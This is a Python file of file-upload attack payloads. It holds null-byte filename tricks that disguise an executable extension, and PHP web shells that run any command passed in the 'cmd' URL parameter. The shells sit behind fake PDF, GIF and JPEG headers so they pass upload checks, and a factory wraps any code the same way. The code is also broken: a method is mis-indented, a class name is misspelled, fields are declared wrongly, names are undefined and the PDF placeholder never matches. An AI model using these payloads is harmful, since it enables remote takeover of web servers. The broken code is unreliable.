#!/bin/python3
# set of payloads

from dataclasses import dataclass

@dataclass 
class Payloads:
  file: FilePayloads
  meta: MetaNullPayloads  
  
@dataclass
class FileMeta:
  filename: str
  def format(self,ext_target,ext_fake)->str: return self.filename.format(ext_target=ext_target,ext_fake=ext_fake)
    
@dataclass
class ReqMeta:
  paramName: str
   def format(self,ext_target,ext_fake)->str: return self.paramName.format(ext_target=ext_target,ext_fake=ext_fake)

@dataclass
class MetaNullPayloads:
  file: MetaNullPayloadsFile
  req: MetaNullPayloadsReq

@dataclass
class MetaNullPayloadsFile:
  urlencNull: FileMeta(filename="file.{ext_target}%00.{ext_fake}")
  asciiNull: FileMeta(filename="file.{ext_target}\x00.{ext_fake}")

@dataclass
class MetaNullPayloadsReq:
  urlencNull: ReqMeta(paramName="file.{ext_target}%00.{ext_fake}")
  asciiNull: ReqMeta(paramName="file.{ext_target}\x00.{ext_fake}")

@dataclass
class FilePaylods:
  php: FilePayloadsPHP


@dataclass
class FilePayloadsPHP:
  pdf: str = """%PDF-1.4
<?php
$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';
$handle = popen($cmd, "r");
$output = fread($handle, 4096);
pclose($handle);
echo $output;
?>"""
  gif: str = """GIF89a
<?php
$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';
$handle = popen($cmd, "r");
$output = fread($handle, 4096);
pclose($handle);
echo $output;
?>
"""
  jpeg: str = """\xFF\xD8\xFF
<?php
$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '';
$handle = popen($cmd, "r");
$output = fread($handle, 4096);
pclose($handle);
echo $output;
?>
"""

@dataclass
class FilePayloadFactory:
  replaceKeyword: str = "__013374901834903810948103__FILE__"
  pattern: bytes
  fakeExtention: str

  def make(self, desiredCode: bytes) -> bytes:
    return pattern.replace(replaceKeyword, desiredCode)

@dataclass
class FilePayloadFactories:
  pdf: FilePayloadFactory = FilePayloadFactory(pattern=b"""%PDF-1.4\n___013374901834903810948103__FILE__""",fakeExtention="pdf")
  gif: FilePayloadFactory = FilePayloadFactory(pattern=b"""GIF89a\n__013374901834903810948103__FILE__""",fakeExtention="gif")
  jpeg: FilePayloadFactory = FilePayloadFactory(pattern=b"""\xFF\xD8\xFF\n__013374901834903810948103__FILE__""",fakeExtention="jpeg")
